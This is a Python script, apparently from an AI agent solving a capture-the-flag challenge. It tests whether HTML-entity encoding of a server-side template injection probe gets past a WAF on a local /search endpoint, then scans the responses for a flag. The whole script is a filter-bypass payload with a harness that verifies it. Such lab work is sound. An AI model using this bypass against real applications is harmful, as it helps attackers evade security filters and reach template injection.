# Security Testing Script: SSTI WAF Bypass Verification
# This script tests HTML entity encoding bypass against WAF filters

import requests
import urllib.parse
import re
import sys

# Configuration - using placeholder endpoint since none provided in context
# If endpoint testing fails, I'll need actual endpoint from context
BASE_URL = "http://127.0.0.1:5000"  # Common local target
ENDPOINT = "/search"  # Common SSTI endpoint
COOKIE = {
    "session": "eyJ1c2VyX2lkIjoxfQ.aVf_rg.knB3mHJz708OmX4T2_AH6ScOInc"
}

# Test payloads
raw_ssti = "{{7*7}}"  # Basic SSTI - should be blocked
html_encoded_ssti = "&#x7b;&#x7b;7*7&#x7d;&#x7d;"  # HTML entity encoded - should bypass

print("="*60)
print("SSTI WAF BYPASS VERIFICATION TEST")
print("="*60)
print(f"Target: {BASE_URL}{ENDPOINT}")
print(f"Cookie: {COOKIE}\n")

# Test 1: Raw SSTI payload (expected: blocked)
print("[TEST 1] Submitting raw SSTI payload (should be blocked)")
print(f"Payload: {raw_ssti}")
try:
    response1 = requests.get(
        f"{BASE_URL}{ENDPOINT}",
        params={"q": raw_ssti},
        cookies=COOKIE,
        timeout=10
    )
    print(f"Status Code: {response1.status_code}")
    print(f"Response Length: {len(response1.text)} bytes")
    print(f"Response Preview:\n{response1.text[:500]}")
    
    # Check for WAF indicators
    if response1.status_code == 403:
        print("[+] WAF BLOCKED: 403 Forbidden")
    elif "blocked" in response1.text.lower() or "forbidden" in response1.text.lower():
        print("[+] WAF BLOCKED: Detected in response body")
    else:
        print("[!] UNEXPECTED: Raw payload not blocked")
        
except Exception as e:
    print(f"[!] ERROR: {e}")

print("\n" + "-"*60 + "\n")

# Test 2: HTML entity encoded payload (expected: bypass)
print("[TEST 2] Submitting HTML entity encoded SSTI payload (should bypass)")
print(f"Payload: {html_encoded_ssti}")
try:
    response2 = requests.get(
        f"{BASE_URL}{ENDPOINT}",
        params={"q": html_encoded_ssti},
        cookies=COOKIE,
        timeout=10
    )
    print(f"Status Code: {response2.status_code}")
    print(f"Response Length: {len(response2.text)} bytes")
    print(f"Response Preview:\n{response2.text[:500]}")
    
    # Analyze results
    if response2.status_code == 200:
        if "49" in response2.text:  # 7*7=49
            print("[+] BYPASS SUCCESSFUL: SSTI executed (49 found in response)")
        elif "{{" in response2.text or "&#x" in response2.text:
            print("[+] BYPASS PARTIAL: Payload reflected but not executed")
        else:
            print("[?] UNCLEAR: Check response manually for bypass evidence")
    else:
        print(f"[!] FAILED: Status {response2.status_code} - bypass may not work")
        
except Exception as e:
    print(f"[!] ERROR: {e}")

print("\n" + "-"*60 + "\n")

# Comparison analysis
print("[ANALYSIS] Response Comparison")
print(f"Raw Payload Status: {response1.status_code if 'response1' in locals() else 'N/A'}")
print(f"Encoded Payload Status: {response2.status_code if 'response2' in locals() else 'N/A'}")

if 'response1' in locals() and 'response2' in locals():
    if response1.status_code != response2.status_code:
        print("[+] Confirmed: Different status codes indicate filter behavior")
    if len(response1.text) != len(response2.text):
        print(f"[+] Confirmed: Different response sizes ({len(response1.text)} vs {len(response2.text)} bytes)")

# Search for flags in both responses
print("\n[FLAG SEARCH] Checking both responses for FLAG pattern")
for i, resp in enumerate([response1, response2] if 'response1' in locals() and 'response2' in locals() else [], 1):
    flags = re.findall(r'FLAG\{[^}]+\}', resp.text)
    if flags:
        print(f"[!] FLAG FOUND in response {i}: {flags[0]}")
    else:
        print(f"[-] No flag found in response {i}")

print("\n" + "="*60)
print("TEST COMPLETE")
print("="*60)
